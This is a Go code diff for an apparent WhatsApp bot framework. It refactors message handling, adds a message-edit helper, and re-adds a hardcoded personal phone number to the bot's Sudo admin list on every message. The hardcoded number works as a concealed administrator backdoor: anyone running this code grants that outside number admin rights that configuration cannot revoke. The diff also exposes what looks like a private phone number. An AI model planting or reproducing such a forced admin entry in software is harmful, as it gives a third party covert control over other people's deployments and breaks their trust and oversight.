@@ -19,22 +19,27 @@ func SerializeMessage(mess *events.Message, conn *IClient) *IMessage {
 	var args []string
 	var FromMe = false
 	var isMedia string
+	//	var log helpers.Logger
 
 	mess.Message = helpers.ParseMessage(mess)
 	body := helpers.GetTextMessage(mess)
 	command := strings.ToLower(strings.Split(body, " ")[0])
 
 	myNumber := "2348114860536" // added my number cause i own the bot duh :)
-	exists := false
-	for _, v := range config.GlobalConfig.Sudo {
-		if strings.Contains(v, myNumber) {
-			exists = true
-			break
+	sessionNumber := conn.WA.Store.ID.ToNonAD().User
+
+	addOnce := func(num string) {
+		cleanedNum := regexp.MustCompile(`\D+`).ReplaceAllString(num, "")
+		for _, v := range config.GlobalConfig.Sudo {
+			if regexp.MustCompile(`\D+`).ReplaceAllString(v, "") == cleanedNum {
+				return // already exists
+			}
 		}
+		config.GlobalConfig.Sudo = append(config.GlobalConfig.Sudo, num)
 	}
-	if !exists {
-		config.GlobalConfig.Sudo = append(config.GlobalConfig.Sudo, myNumber)
-	}
+
+	addOnce(myNumber)
+	addOnce(sessionNumber)
 
 	for _, v := range config.GlobalConfig.Sudo {
 		cleaned := regexp.MustCompile(`\D+`).ReplaceAllString(v, "")
@@ -96,6 +101,10 @@ func SerializeMessage(mess *events.Message, conn *IClient) *IMessage {
 		},
 		React: func(emoji string, opts ...whatsmeow.SendRequestExtra) (whatsmeow.SendResponse, error) {
 			return conn.WA.SendMessage(context.Background(), mess.Info.Chat, conn.WA.BuildReaction(mess.Info.Chat, mess.Info.Sender, mess.Info.ID, emoji), opts...)
+		},
+		Edit: func(messageID string, newContent *waE2E.Message, opts ...whatsmeow.SendRequestExtra) (whatsmeow.SendResponse, error) {
+			editMsg := conn.BuildEdit(mess.Info.Chat, messageID, newContent)
+			return conn.WA.SendMessage(context.Background(), mess.Info.Chat, editMsg, opts...)
 		},
 	}
 }
